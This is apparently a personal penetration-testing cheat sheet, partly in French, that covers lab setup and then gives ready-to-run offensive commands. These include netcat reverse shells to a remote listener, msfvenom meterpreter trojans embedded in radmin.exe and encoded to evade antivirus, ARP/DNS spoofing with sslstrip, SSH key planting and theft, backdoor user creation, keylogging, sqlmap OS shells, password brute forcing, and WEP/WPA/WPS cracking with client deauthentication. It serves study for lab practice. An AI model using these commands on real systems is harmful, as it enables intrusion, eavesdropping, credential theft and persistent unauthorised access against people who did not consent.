# omegaspard-pentest-cheat-sheet
My penetration testing cheat sheet.

## Download links to set up lab environment.

### Attacker machine

- [VMWare](https://my.vmware.com/web/vmware/downloads)
- [OSCP Kali linux distribution VM](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
- [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)
  A vulnerability scanner.
  - Download and install the deb package.
  - Run the service with `/bin/systemctl start nessusd.serivce`
  - Go to https://kali:8834/# to finish the installation.
- [Ming C Compiler]()
  Cross compiler to run C code on windows.
  `apt-get install mingw-w64`
- [Hyperion](https://nullsecurity.net/tools/binary.html)
  Encrytion program to bypass antivirus software.
  - Need to install the Ming C Compiler.
  - Download the zip file.
  - Generate the exe file with `i686-w64-mingw32-gcc -ISrc/Payloads/Aes/c Src/Crypter/*.c Src/Payloads/Aes/c/*.c -o hyperion.exe`
- [Veil-Evasion]()
  Payload generator to bypass antivirus software.
  - Download https://github.com/Veil-Framework/Veil-Evasion/archive/master.zip
  - Unzip and run the ./setupt/setup.sh file.
  
### Target machine

- [Android studio](https://developer.android.com/studio)
  To get the android sdk and the emulator.
- [Ubuntu 8.10 VM torrent file (by Georgia Weidman)](https://nostarch.com/download/Penetration%20Testing%20Georgia%20Weidman%20Supplementary%20Files%20No%20Starch%20Press%20[mininova].torrent)
- [Windows XP SP3 (no product key)](https://archive.org/details/windowsxp_20190627) 
- [Windows 7 SP1](https://support.microsoft.com/en-us/windows/install-windows-7-service-pack-1-sp1-b3da2c0f-cdb6-0572-8596-bab972897f61)

**Vulnerable software for Windows XP**

- [Zervit 0.4](http://www.exploit-db.com/exploits/12582/).
  - Use the port 3232.
- [SLMail 5.5](http://www.exploit-db.com/exploits/638)
  - Restart VM and set up user after installation.
- [3Com TFTP 2.0.1](http://www.exploit-db.com/exploits/3388/)
  - Copy the file to `C:\Windows`, run and install service.
- [XAMPP 1.7.2](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.7.2/xampp-win32-1.7.2.zip/download)
  - Add the service that you want (Apache, MySql, FilzZilla etc)
  - Set up user.
- [Adobe acrobat reader 8.1.2](http://www.oldversion.com/windows/acrobat-reader-8-1-2)
- [War-FTP 1.65](http://www.exploit-db.com/exploits/3570/)
- [WinSCP](http://winscp.net/)

**Addtional tools for Windows XP**

- [Immunity debugger](http://debugger.immunityinc.com/ID_register.py)
  (It will install Python)
- [Mona](https://github.com/corelan/mona/archive/master.zip)
  - Copy the file `mona.py` to `C:Program Files\Immunity Inc\Immunity Debugger\PyCommands`.
  
**Additional tools for Windows 7**
- [Java 7](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)
- [Winamp version 5.55](http://www.oldversion.fr/windows/download/winamp-5-55-full-2)
- [Microsoft Security Essentials](https://www.commentcamarche.net/download/telecharger-34061039-microsoft-security-essentials)

## Basic Linux commands

**adduser**

Permet de créer un nouvel utilisateur et son groupe correspondant.

- `adduser gaspard` pour créer l'utilisateur.
- `adduser gaspard omega` pour ajouter l'utilisateur gaspard au groupe omega.
- `adduser gaspard sudo` ajouter gaspard au groupe `sudoers` qui permetra d'utiliser la commande `sudo` en tant que gaspard.



**nano**

- `nano file_name` to open file.
- `CTRL+W` to search.
- `CTRL+X` to exit.
- `CTRL+K` to cut and `CTRL+U` to uncut.
- `CTRL+J` to justify.
- `CTRL+O` to save.

**vi**

- Enter `I` to be in insert mode and type stuff then `ESC` to leave the `INSERT` mode.
- `:wq` to save and exit.

**grep**

Look for instance of string in what we give to it.

- `grep hahaha file_hahah` will look for *haha* in fiel_haha.

**cut**

Extract from entry based on a delimiter.

- `cut -d " " -f 2` will return the second word separated from a space of each line we pass to it.

**sed**

Replace based on pattern.

- `sed 's/hello/bonjour' file_name` will replace hello by bonjour in file_name and return the string of the new file on the standard output.

**awk**

Pattern matching.

- `awk '$2 >4' file_name` for each line in file_name, will return each line in which the seocond word is greater than 4.
- `awk '{print $1,$3;}' file_name` return the first and third word of each line and print it.

**Networking**

- `ifconfig`
- Edit `/etc/network/interfaces` to set a static IP address.
- `netstat -antp` to see what program use which port and what is the current state. 

**apt**

Manage package on the system.

- `apt-get install pacakge_name`
- `apt-get upgrade package_name`
- `apt-get update` to update the cache with the `sources.list file`.

**Services**

Start and stop services.

- `systemctl service_name start`
- `systemctl service_name stop`
- `systemctl service_name enable`
- `systemctl service_name disable`

The command `service` can also be used, if the service isn't available in those command the service bin should be in `/etc/init.d` or `/etc/rc.d`.

**Netcat**

To mannipulate TCP/IP connections netcat is a good tool.

- `nc -v 192.168.25.36 80` create a netcat connection with the address IP on the port 80 (-v for verbose mode).
- `nc -lvp 8888` create a netcat that wait for connection on the port 8888.
- `nc -lvp 8888 -e /bin/bash` will open a shell if it receives a connection on the port 8888.
- `nc -v 192.168.25.36 80 -e /bin/bash` push the command shell to the netcat listener.
- `nc -v 192.168.25.36 8888 < file` connect to netcat then write the file to it.
- `nc -lvp 8888 > file` wait for a connection and write the file.

**cron**

Schedule tasks.

- In the folder `/etc` we can find directories like `crond.d`, `crond.daily`, `crond.hourly`, `crond.monthly`, `crond.weekly` those execute the scripts present in them at a period corresponding to the one indicated to their name.
- `crontab` is a file used for custom scheduling.
- The format of each corn entry is `m h dom mon dow user command`, dom for day, mon for month.

## Scripts

- The file must start by `#!/bin/bash` this comment indicate that the script use bash.
- For python it would be `#!/usr/bin/python`.

**if statement**

```bash
#!/bin/bash
if [ "$1" == ""]
then
echo "Usage: ./script_name.sh [arg1]"
echo "example: ./script_name.sh bonjour"
fi
```

**loop statement**

```bash
#!/bin/bash
if [ "$1" == ""]
then
echo "Usage: ./script_name.sh [arg1]"
echo "example: ./script_name.sh bonjour"
else
for number in `seq 1 100`; do
echo $1$number
done
fi
```

## Exploits database website

- [Rapid7](https://www.rapid7.com/db/modules/)

## Metasploits

Metasploit is a big framework that provide many pentesting features.

- To start it you need to:  - `service postgresql start` because it needs a database to run.
  - `msfdb init` to initialize the database.
  - `msfconsole` to start metasploit console interface.
  
- To use an exploit after running the msfconsole :
  - `search [vunerabitlity name]` to get the URI of the exploit.
  - `use [exploit URI]` to use the exploit.
  - `show options` to see the option.
  - `set [OPTION] [VALUE]` to set an option.
  - `show targets` to get the target list of this exploit. (Then use `set [Name/list number of the target]`)
  - `show payloads` to get the list of the exploit. (Then use `set [Name/list number of the payload]`)
  - Once everything needed is set you can start the exploit with `exploit`.

- `msfconsole -x "use [URI]; set [OPTION] [VALUE]; set [TARGET]; set [PAYLOAD]; exploit;` to run on one line.
- `show -h` to display everything we can do on metasploit such as auxiliary allowing you by example to scan or else...

**Bind shell**

Open a port on the target machine, it's up to the attacker to connect to it after.

**Reverse shell**

Pushes a connexion from the target machine to the attacker machine. This one is more likely to succeed because *bind shell* are often bloked by the firefall.

**Staged payloads**

The string send to the target doesn't contain all the instruction to execute the exploit.
We need to use a handler to catch the connexion and complete it.
Since the payload is loaded into the memory space of the process, staged payloads are advantageous because they are light.

**Inline payloads**

Also named single, those kind of payload contains all the necessary instruction to execute the exploit.
It might take more space but it is also more stable and consistant because it already has everything included in the original exploit string.

Note:
- `php/meterpreter/reverse_tcp` correspond to staged payloads.
- `php/meterpreter_reverse_tcp` corresponds to inline payloads.

Note:
The traffic coming in and out of a machine can always be filtered. It's not because we could set up a reverse_tcp payloads that firewall of the network we're trying to attack will let the payload to an unsual port. To counter we can use the HTTP and HTTPS payloads that simulate web traffic, those aren't unsual because most of the company want their employee to access the internet.

Sometimes a webclient based exploit will make the application to crash, it's not what we want because since the exploit depends of the memory space of the application we don't want it to close.
- `set AutoRunScript migrate -f` allow to execute the script migrate that it itself will spawn another process to migrate too.
- Use `sessions` to display the running sessions, `sessions <ID>` to interact with it, `sessions -k <ID>` to kill it.
- Use `jobs` to list the current jobs, `kill <ID>` to kill it.


**Msfvenom**

Msfvenom is a tool generating executable payload on the target machine. 

Note: It does not handle the delivery of the payload and we need to exploit an user fault in order to make it execute the payload.

- `msfvenom -l payloads` to list the payload.
- `msfvenom -p [PAYLOAD URI] -o` to show the needed options of the payload.
- `msfvenom --help-formats` to display all the available format of the generated payload.
- `msfvenom -p [PAYLOAD URI] [OPTION 1]=[VALUE] [OPTION X}=[VALUE] -f exe -o [GENERATED PAYLOAD NAME]` to produce the payload.
- `msfvenom -p windows/meterpreter/reverse_tcp -x /usr/share/windows-binaries/radmin.exe LHOST=192.168.43.78 LPORT=2345 -k -f exe > trojan.exe` to create a meterpreter payload that will be include in the exe radmint. The k option put it in a different thread so it doesn't hang the main process.
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.78 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > trojan_encoded.exe` To encode the payload 10 times (option i) with the encoding algorithù shikata_ga_nai. It allow the payload to bypass antivirus. (Check it on [Virus total](www.virusttotal.com)) 

Example:
`msfvenim -p windows/meterpreter/revese_tcp LHOST=192.168.43.78 LPORT=12345 -f exe -o payload.exe`

Note: A meterpreter payload is an upgraded shell. Natively when we connect a shell from a windows machine, we use it on a linux shell, it's ugly.
Meterpreter make it transparent and propose other feature.

**multihandler**

If we execute a payload on the target machine generated by msfvenom, we still to receive the connexion from the target.

In msfconsole:
- `use multi/handler`
- `show options`
- `set LHOST 192.168.43.78`
- `set LPORT 12345`
- `exploit` The handler is now waiting for connexion on the attacker machine on the port.

## Informations gathering and finding vulnerabilities

- [Netcraft](https://sitereport.netcraft.com) A website scanner.
- `whois website.com` gives informations surch as technical contacts or DNS name servers.
- `nslookup` command to learn more about the DNS of the target server.
- Zone transfer allow to replicate the data from the primary DNS server to a backup, if it's not secure we can use the command `host -l domain.com ns.domain.com` to get the DNS records, and eventually get informations about the different services known to have vulnerabilities.
- `theharvester -d google.com -l 500 -b all` browse the internet with the specified domain looking for critical informations (mail, username, phone number, websites)

**Note on DNS**
DNS means Domain Name System,it is the service that resolve the IP address of a server to its domain name counter part.

A domain name is the human readable name that we use in order to browse the internet such as `www.google.com` where `www` is the sub domain, `google.com` is the domain and `com` is the TLD (Second Level Domain). Those are managed by organisation named `Domain registrar`.

Another component of the DNS are the `Domain servers` those are the machine linking the IP address to the different domain name, the entity linking the two are named
`DNS records`, the most commons are the `A record` or the `MX record` (mail server).

**Port scanning**

- `nc -vv 192.168.43.245 25` scan mannually with netcat (legal).
- `nmap -sV [ADDRESS] -oA [FILENAME]` run a TCP scan giving infos on the versions with the result wrote in the file.
- `nmap -sU -p [PORT] [ADDRESS]` run a UDP scan on the specific port.
- `nmap -script=[SCRIPT NAME] [ADDRESS]` run a nma scna using the scrip specified, the scripts are present `/usr/share/nmaps/scripts`.

**Web scanning**

- `nikto -h <ADDRESS>` scan the web service on the address.
- `cadaver <URL>` a WebDav client for unix. Will try to lok into the WebDav interface.

## Traffic capture

- `Wireshark` tools to capture trafic.

**Arp**

Means `Address resolution protocol`, basicly when a machine on a network ask `whos is 192.168.43.245` broadcasted to everyone on the same network and that the concerced machine answered `I'm 192.168.43.245` with its MAC address.
The vulneabiltiy of this protocol is that their is no way to identify that the machine answering is the right machine, ARP poisoninng is based on that.
The attacker will answer the ARP query from the sender and therefore receive the query that the attacker will forward to not DDOS the true receiver of the network.
With that the attacker can lsiten the traffic between the 2 machine.

- `arp` command to display the arp cache. The mapping between the address (name) and the mac address.
- The IP forwarding is a feature of the linux kernel, if a machine with IP forwarding receive a packet that wasn't destined for itself then it will root the packet over the network. To enable it use `echo 1 > /proc/sys/net/ipv4/ip_forward`, this way is reboot persistant.
- `arpspoof -i eth0 -t 192.168.43.245 1922.168.43.199` and `arpspoof -i eth0 -t 192.168.43.199 192.168.43.245` to listen the traffic between the two machine over network.
- `arpspoof -r -i eth0 -t 192.168.43..24 192.168.43.199` -r make the spoof for the 2 targets.
- `arpspoof` can be used on the default gateway to listen the traffic witht a machine on the network and the internet.

**Dns**

- `dnspoof -i eth0 -f hosts.txt` to fake the dns and redirect some lookup to what's in the file hosts.txt.

**SSL**

SSL are certificate exchanged between an user and a website to ensure that the user is exchanging with right website. Server's SSL certificate are owned by trudted comapnies, browsers own a list refering to some of them (CA). If a CA validate a certificate a SSL secured connexion can start between the user and the website.

`ettercap -Ti eth0 -M arp:remote /192.168.43.1// /192.168.43.199//` to sniff supposed SSL secured connexion.
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080` then `sslstrip 8080` before runing an arpspoof on the default gateway, this method doesn't return an invalid certificate from facebook (because it comes from ettercap) and the user isn't presented the SSL warning.


## Attacks

- `atftpd --daemon --bind-address 192.168.43.78` create a ftp server. The default directory is /etc/tftp)
- `tftp 192.168.43.78 get <FILE NAME REMOTE> <FILE NAME LOCAL>` to download a file from the server.
- On linux we can share folders over the network with NFS, by default is available to anyone wihout credentials:
  - Use `mdkir /tmp/mount` to create the folder that will receive the NFS home folder
  - `mount -t nfs -o nolock 192.168.43.199:/export/user /tmp/mount` to mount the folder with NFS
  - `cd /tmp/mount` to access the home folder.

**ssh**

If we get access to the .ssh folder of the target, we can  add our own public keys to the `~/.ssh/authorized_keys` file in order to ssh connect without using a password.

- `ssh-keygen -t rsa` to generate private/public ssh key.
- `cat ~/.ssh/id_rsa.pub >> <TARGET PATH>/authorized_keys`

Or even better, we can copy the target's private/public key into the attacker .ssh folder.

- Delete the attacker private/public key.
- Copy the target private/public key to the attacker ssh folder.
- `ssh-add`.

Note: the `id_rsa` permission must be 600.

## Password attacks.

Basicly brute force on logins and hashes.

**Logins resources**
- [http://packetstormsecurity.com/Crackers/wordlists](http://packetstormsecurity.com/Crackers/wordlists)
- [http://www.openwall.com/wordlists/](http://www.openwall.com/wordlists/)
- On kali linux `/usr/share/wordlists`, it is zipped.
- `/usr/share/john/password.lst`

**cewl**

Website scrapper that generate worlists.

- `cewl -w <OUTPUT FILE NAME> -d -m 5 <URL>` write a wordlist in the specified file from the specified URL follwing with a minium of 5 character per word.

**crunch**

Generate combination of characters.

- `crunch 7 7 AB` list of all the combinations with A and B with a length of 7.

**hydra**

Longon cracker that support multiples services.

- `hydra -L <FILE USER LIST> -p <FILE PASSWORD> <IP ADDRESS> <SERVICE>`

## Bypassing antivirus

- Use msfvenom encoders `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.78 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > trojan_encoded.ex`.
- Use hyperien `cd <Hyperion Folder>; wine hyperion <FILE TO ENCODE> <OUTPUT FILE>`

## Post exploitation

After gaining access to the target machine, the goal is to make the most of it, by that we mean:
- Obtaining more privilege
- Obtaining login credentials
- Obtaining sensible informations
- Putting a back door

**Meterpreter post exploitation**

Meterpreter propose tools to do get the most of the post exmploitation step:
- `upload` to upload files.
- `run migrate -p <PID>` to migrate the meterpreter session.
- `getuid` to get informations on the use we're logged as on the target machine (Windows).
- The post exploitation module ex `use post/windows/gather/enum_logged_on_users` or `use exploit/windows/local/ms11_080afdjoinleaf`.
- `getsystem` to get informations on the system (Windows).
- `search -f *password*` search for the file and folders with password in it.
- `keyscan_start` to start the keylogging, `keyscan_dump` to get the results and `keyscan_stop`.

**Ohter ways**

- `uname -a` get system infos (linux).
- `udevadm --version` get the exact system version.
- `/usr/share/exploitdb/searchsploit udev` database of exploit on Kali linux.
- Add a user on the system `net add user bob password /add` (windows) or `sudo useradd -p $(openssl passwd -1 password) username` (linux) openssl is used to managed the md5 encoding of the password creation.
- Creating a cron job to put a open a bash that will connect to the attacker machine with nc.
- Sometimes we gain acces to the target machine that is itself connected to a subnetwork to other machine, the subenetwork might not be reachable from the internet so we need to use a proxychain like `proxychains nmap -Pn -sT -sV <PORTS> <IP ADDRESS>`.

## Web Application Testing

**Burp Proxy**

A proxy tool on kali linux that will capture the request between the client and the application before they are sent/received. (need to set up the browser)

**SQL injection**

- `select username from users where user="" or 1 = 1 and password="" or 1 = 1;` is a very common sql injection.
- To test the interaction with the database we can notice the URL that path information to the database such as `http://url.com?id=1'` the presence of the ' will put unattended charaters in the server script and it should return an error if user input aren't escaped.
- `sqlmap -u "http://192.168.43.96/bookservice/bookdetail.aspx?id=2" --os-shell` will test the url and enable shell if it succeed to inject code.

**XPath injection**

When the we can execute something like `' or '1'= '1` for user and password and it still works.


**XSS injection**

Execute java script code in user input field on the web app.

**Remote file injection**

Use a vulnerability to download a malicious file on the target server and execute (by querying it in the browser), it can be done with the XSS injection or with PHP. We put the js code that would open a shell.

## Wireless attack

- `iwconfig` to get the wireless card interfaces.
- `iwlist wlan0 scan` to check the reachable network and get their infos such as MAC address, SSID and the channel.
- Use `airmon-ng check` to check the process that could iterfere with our scanning then `airmon-ng check kill`
- `airmon-ng start wlan0` to set up the wlan0 interface in monitor mode.
- `airmon-ng monO --channel 6` to gether packets.

**WEP**
Wired equivalent privacy.
Is crackable because the randomness of the encryption algoryhtm (the 24-bit IV) is weak. It introduce only 2^34 values. So if an attacker get enough cipthertext s encrypted witht he same key, he can guess the passphrase.

- `airdump-ng -w book monO --channel 6` to write all the packet to a file.
- `aireplay-ng -1 (-1 SAYS TO FAKE AUTH) 0 (THE RETRANSMISSION TIME) -e linksys (THE SSID) -a <MAC ADDRESS OF THE ACCESS POINt> -h <MAC ADDRESS OF OUR CARD> monO (THE INTERFACE)` use this command to fake auth and generate enough ciphertexts.
- `aireplay-ng -3 -b <MAC ADDRESS OF ACCESS POINT> -h <MAC ADDRES OF OUR CARD> monO` same than above but with ARP request.
- `aircrack-ng -b <ACCESS POINT MAC> <FILE NAME>` to crack the key.

**WPA**
Means wifi protected access.
Different informations are exchanged such as:
- The PMK (pairwiase master key) is shared between the client and the acess point and it's generated by feeding the PBKDF2 encoding algorithm by:
  - SSID
  - SSID lenght
  - The passphrase (PSK)
  - The resulting lenght of the PMK itself
- The PTK (pairwise transient key) is the key created by the PBKDF2 hashing algorithm and used to encrypt the direct exchange between the client and the access point, it's genered by:
  - Anounce (random number from access point)
  - Snounce (random number from client)
  - The PMK
  - Client MAC address
  - Access point MAC address
  
 The PMK and the PTK are made during a four way hand shake:
 1. Access point to client: ANonce
 2. Client to access point: SNonce + MIC
 3. Client to access point: GTK + MIC
 4. Ack from access point to client
 
 Note: MIC means message inetgrity code, it's used to protect from forgery attacks. A forgery attack is when the attacker resend an already send packet over the network. By adding the MIC (that is computed from passphrase) an attacker cannot resend the packet unless he knows the passphrase that generate the MIC.
  
- `airodump-ng -c 6 --bssid <MAC ADDRESS> -w pentestbook2 monoO` to capture the four way handshake.
- `aireplay-ng -0 1 -a <MAC ADDRESS> -c <MAC ADDRESS CLIENT> mon0` to deauthenticate a client from the access point.
- `aircrack-ng -w password.lst -b <MAC ADDRESS> <CAP FILES>` to crack the passphrase from a password list.

**WPS**
Wifi protected setup.
An option proposed by rooter that allow to connect a client with a pin instead of the passphrase.
Much easier to crack.

- `bully mon0 -b <MAC ADDRESS> -e <SSID> -c 6` to creack the WPS pin.
